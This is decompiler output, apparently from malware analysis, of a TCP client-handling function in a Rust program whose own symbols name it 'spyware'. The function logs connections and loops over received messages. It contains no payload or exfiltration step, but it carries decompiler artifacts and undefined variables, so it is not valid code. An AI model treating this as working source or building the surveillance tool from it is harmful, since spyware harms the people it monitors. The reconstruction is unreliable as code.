fn spyware::communication::server::handle_client(a0: u32) -> long long {
    let v0: u32;  // [bp-0xf4]
    let v1: u64;  // [bp-0xf0]
    let v2: core::result::Result<core::net::socket_addr::SocketAddr, std::io::error::Error>;  // [bp-0xe8], Other Possible Types: struct40
    let v3: u128;  // [bp-0xe8]
    let v4: u32;  // [bp-0xe6]
    let v5: u16;  // [bp-0xe2]
    let v6: u64;  // [bp-0xe0]
    let v7: u128;  // [bp-0xd8]
    let v8: u128;  // [bp-0xc8]
    let v9: u128;  // [bp-0xb8]
    let v10: struct64;  // [bp-0xa8], Other Possible Types: u64
    let v11: u64;  // [bp-0xa0]
    let v12: i64;  // [bp-0x98]
    let v13: u64;  // [bp-0x90]
    let v14: void*;  // [bp-0x88]
    let v15: i64;  // [bp-0x68]
    let v16: u64;  // [bp-0x60]
    let v18: struct64;  // [bp-0x58]
    let v19: u16;  // [bp-0x58]
    let v20: u32;  // [bp-0x56]
    let v21: u16;  // [bp-0x52]
    let v22: u64;  // [bp-0x50]
    let v23: u64;  // [bp-0x50]
    let v24: u128;  // [bp-0x48]
    let v25: u128;  // [bp-0x48]
    let v26: u128;  // [bp-0x38]
    let v27: u128;  // [bp-0x28]
    let v28: u128;  // [bp-0x18]
    let v32: u128;  // xmm0

    v0 = a0;
    if core::sync::atomic::atomic_load() >= 4 {
        v2 = std::net::tcp::TcpStream::peer_addr(&v0);
        match v2 {
            Err(_) => {
                return v23;
            },
            Ok(_) => {
                v21 = v5;
                v20 = v4;
                v28 = *((&v2 as &char + 16) as &i128);
                v19 = v2 as i16;
                v22 = v6;
                v24 = *((&v2 as &char + 16) as &i128);
                v15 = &v19;
                v16 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
                v10 = "Handling connection from ";
                v11 = 1;
                v14 = 0;
                v12 = &v15;
                v13 = 1;
                v2 = struct40 {
                    field_0: "spyware::communication::server"
                    field_16: "spyware::communication::server"
                    field_32: log::__private_api::loc("src/communication/server.rs")
                };
                log::__private_api::log(&v10, 4, &v2);
            },
        }
    }
    loop {
        vvar_272{stack -88} = struct64 OrderedDict([(0, 𝜙@16b [((4509465, None), vvar_159{stack -88}), ((4509262, None), vvar_215{stack -88}), ((4508993, None), None)]), (16, 𝜙@128b [((4509465, None), vvar_161{stack -72}), ((4509262, None), vvar_217{stack -72}), ((4508993, None), None)]), (32, 𝜙@128b [((4509465, None), vvar_172{stack -56}), ((4509262, None), None), ((4508993, None), None)]), (48, 𝜙@128b [((4509465, None), vvar_173{stack -40}), ((4509262, None), None), ((4508993, None), None)])])
        spyware::communication::server::get_message(&v18, &v0);
        if v18.field_0 as i64 == 9223372036854775818 {
            break;
        }
        v32 = v18.field_0;
        v9 = v27;
        v8 = v26;
        v7 = v25;
        v3 = v32;
        println!("Got message!!!");
        v10 = struct64 {
            field_0: v3
            field_16: v7
            field_32: v8
            field_48: v9
        };
        spyware::communication::server::handle_message(&v10, &v0);
    }
    v1 = v23;
    println!("Error!!");
    if !core::sync::atomic::atomic_load() {
        return v23;
    }
    v15 = &v1;
    v16 = <std::io::error::Error as core::fmt::Display>::fmt;
    v10 = "An error occurred while trying to get message. Error: ";
    v11 = 1;
    v14 = 0;
    v12 = &v15;
    v13 = 1;
    v2 = struct40 {
        field_0: "spyware::communication::server"
        field_16: "spyware::communication::server"
        field_32: log::__private_api::loc("src/communication/server.rs")
    };
    log::__private_api::log(&v10, 1, &v2);
    return v23;
}
